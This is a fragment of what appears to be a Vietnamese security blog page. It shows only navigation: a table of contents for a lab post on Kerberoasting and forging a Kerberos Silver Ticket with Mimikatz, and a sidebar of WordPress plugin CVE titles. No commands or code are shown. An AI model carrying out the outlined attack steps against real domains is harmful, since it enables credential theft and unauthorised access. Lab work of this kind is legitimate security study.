cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ired-Team-Kerberos-Silver-Ticket"><span class="toc-number">1.</span> <span class="toc-text">Ired.Team Kerberos Silver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Execution"><span class="toc-number">1.1.</span> <span class="toc-text">Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-1-Chuan-bi-moi-truong"><span class="toc-number">1.1.1.</span> <span class="toc-text">Bước 1: Chuẩn bị môi trường</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-2-Tao-user-service-account-co-password-yeu"><span class="toc-number">1.1.2.</span> <span class="toc-text">Bước 2: Tạo user&#x2F;service account có password yếu</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-3-Xac-minh-SPN-da-duoc-gan"><span class="toc-number">1.1.3.</span> <span class="toc-text">Bước 3: Xác minh SPN đã được gán</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-4-Thuc-hien-Kerberoasting-tu-may-tan-cong"><span class="toc-number">1.1.4.</span> <span class="toc-text">Bước 4: Thực hiện Kerberoasting từ máy tấn công</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-5-Tao-Silver-Ticket-voi-Mimikatz"><span class="toc-number">1.1.5.</span> <span class="toc-text">Bước 5: Tạo Silver Ticket với Mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-6-Khai-thac-Truy-cap-Service"><span class="toc-number">1.1.6.</span> <span class="toc-text">Bước 6: Khai thác - Truy cập Service</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/14/2026-14-02-CVE-2026-0702/" title="CVE-2026-0702 WordPress VidShop Plugin &lt;= 1.1.4 is vulnerable to a high priority SQL Injection">CVE-2026-0702 WordPress VidShop Plugin &lt;= 1.1.4 is vulnerable to a high priority SQL Injection</a><time datetime="2026-02-14T09:29:23.541Z" title="Created 2026-02-14 16:29:23">2026-02-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/11/2026-11-02-CVE-2026-23550/" title="CVE-2026-23550 WordPress Modular DS Plugin &lt;= 2.5.1 is vulnerable to a high priority Privilege Escalation">CVE-2026-23550 WordPress Modular DS Plugin &lt;= 2.5.1 is vulnerable to a high priority Privilege Escalation</a><time datetime="2026-02-11T02:25:47.507Z" title="Created 2026-02-11 09:25:47">2026-02-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/03/2026-02-03-CVE-2025-13329/" title="CVE-2025-13329 File Uploader for WooCommerce">CVE-2025-13329 File Uploader for WooCommerce</a><time datetime="2026-02-03T15:56:51.995Z" title="Created 2026-02-03 22:56:51">2026-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</a><time datetime="2026-01-31T17:12:36.483Z" title="Created 2026-02-01 00:12:36">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/2026-01-27-CVE-2025-14770/" title="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</a><time datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>